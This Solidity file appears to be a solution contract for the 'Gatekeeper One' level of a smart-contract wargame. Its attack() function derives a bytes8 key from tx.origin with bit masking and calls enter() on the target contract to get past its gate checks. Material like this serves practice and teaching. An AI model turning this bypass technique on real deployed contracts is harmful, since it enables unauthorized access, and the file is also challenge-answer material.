// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./13_gatekeeperone.sol";

contract GateOpenerOne {
    GatekeeperOne target;

    constructor(address addr) public {
        target = GatekeeperOne(addr);
    }

    function attack() public returns (bool) {
        bytes8 key;
        // 0x 0000 0000 0000 XXXX
        key = bytes8(uint64(uint16(tx.origin)));
        // 0x 0000 0001 0000 0000
        key = bytes8(uint64(1)) << 32 | key;
        return target.enter(key);
    }
}
